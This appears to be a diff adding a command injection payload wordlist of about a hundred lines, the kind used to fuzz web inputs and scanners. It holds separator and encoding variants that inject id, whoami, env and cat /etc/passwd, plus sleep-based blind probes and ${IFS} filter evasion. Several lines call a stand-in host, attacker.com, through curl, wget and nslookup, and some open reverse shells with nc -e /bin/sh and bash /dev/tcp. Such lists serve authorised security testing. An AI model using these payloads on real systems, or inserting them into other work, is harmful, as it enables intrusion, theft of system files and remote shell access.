@@ -1,0 +1,102 @@
+; id
+| id
+& id
+&& id
+|| id
+`id`
+$(id)
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+|| cat /etc/passwd
+; ls -la
+| ls -la
+& ls -la
+&& ls -la
+|| ls -la
+; ls -la /
+| ls -la /
+; pwd
+| pwd
+; env
+| env
+; printenv
+| printenv
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+|| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; curl http://attacker.com
+| curl http://attacker.com
+; wget http://attacker.com
+| wget http://attacker.com
+; nslookup attacker.com
+| nslookup attacker.com
+; nc -e /bin/sh attacker.com 4444
+| nc -e /bin/sh attacker.com 4444
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+%0aid
+%0a id
+%0awhoami
+%0a cat /etc/passwd
+%0a ls -la
+
+id
+
+ id
+
+whoami
+
+ whoami
+1; id
+1 | id
+1 & id
+1 && id
+1 || id
+127.0.0.1; id
+127.0.0.1 | id
+127.0.0.1 & id
+127.0.0.1 && id
+127.0.0.1 || id
+test; id
+test | id
+test & id
+cmd /c dir
+cmd /c whoami
+cmd.exe /c dir
+cmd.exe /c whoami
+& whoami &
+| whoami |
+%26 whoami
+%7c whoami
+%3b id
+%26%26 id
+%7c%7c id
+a;id
+a|id
+a&id
+a&&id
+a||id
+|/bin/ls
+;/bin/id
+&/usr/bin/id
+${IFS}id
+${IFS}whoami
+${IFS}cat${IFS}/etc/passwd
+1;$(id)
+1;`id`
+$(true)|id
+;id;
+|id|
+||id||
